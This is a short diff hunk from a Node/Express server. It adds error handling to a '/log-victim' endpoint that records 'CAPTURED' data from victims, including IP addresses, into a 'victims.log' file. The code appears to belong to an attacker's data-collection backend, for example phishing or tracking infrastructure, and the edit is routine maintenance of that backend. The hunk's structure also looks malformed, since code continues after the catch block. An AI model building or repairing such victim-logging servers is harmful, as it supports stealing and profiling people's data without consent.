@@ -303,6 +303,11 @@ app.post('/log-victim', express.json(), (req, res) => {
     console.log('💀 CAPTURED:', data);  // Force visible log
     fs.appendFileSync('victims.log', JSON.stringify(data) + '\n');
     res.status(200).send('OK');
+	 } catch (err) {
+    if (!res.headersSent) {  // ← guard
+      res.status(500).send('Internal error');
+    }
+  }
     // Enhanced profile with new fields
     const fullProfile = {
         ip,
